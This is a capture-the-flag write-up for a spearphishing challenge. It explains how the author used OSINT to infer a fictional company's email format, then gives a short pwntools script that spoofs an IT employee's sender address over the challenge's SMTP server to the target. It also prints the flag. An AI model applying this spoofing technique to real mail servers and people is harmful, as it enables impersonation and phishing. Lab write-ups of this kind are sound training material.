## Name: Red Phish Blue Phish
#### Author: Truman Kain (@truman.huntress), Adam Rice (@adam.huntress)
#### Category: Misc
#### Difficulty: N/D
#### Description: You are to conduct a phishing excercise against our client, Pyrch Data.

We've identified the Marketing Director, Sarah Williams (swilliams@pyrchdata.com), as a user susceptible to phishing.

Are you able to successfully phish her? Remember your OSINT ;)

NOTE: The port that becomes accessible upon challenge deployment is an SMTP server. Please use this for sending any phishing emails.

You will not receive an email/human response as the mail infrastructure for this challenge is emulated.

## Procedure
The chall talks about a spearphishing attack and our target user is Sarah Williams with the email ```swilliams@pyrchdata.com```, the chall says ```remember ur OSINT```, so we have to investigate about Sarah and the company pyrchdata.

After looking for pyrchdata at internet, we have found a list of company employees, we can see the employees name and lastname, and using the email ```swilliams@pyrchdata.com```, we just need the first letter of the firstname and their lastname to build our email list. 

![Screenshot 2024-10-25 at 8 24 06 AM](https://github.com/user-attachments/assets/0119ee7e-8130-46a6-af77-7e7bd1e9d727)

the chall gives us a remote intances, and the remote instance is a smtp service ```pyrchdata email server```, from here we can try spoof the IT email Joe Daveren using ```MAIL FROM:<fake@pyrchdata.com>``` from smtp server.

I wrote the following python code to recover the flag.

```
from pwn import *
context(log_level='debug')
r = remote('challenge.ctf.games', 32439)

r.sendlineafter(b'SMTP 1.4.6',b'ehlo pyrchdata.com')
r.sendlineafter(b'HELP\r\n',b'mail from:<jdaveren@pyrchdata.com>')
r.sendlineafter(b'OK',b'rcpt to:<swilliams@pyrchdata.com>')
r.sendlineafter(b'OK',b'DATA')
r.sendlineafter(b'with',b'hello from hell')
r.sendline(b'\r\n.\r')

r.interactive()
```

<img width="1341" alt="Screenshot 2024-11-03 at 10 58 30 PM" src="https://github.com/user-attachments/assets/cd6714af-e61c-435f-a602-220b588ed212">

flag ```flag{54c6ec05ca19565754351b7fcf9c03b2}```


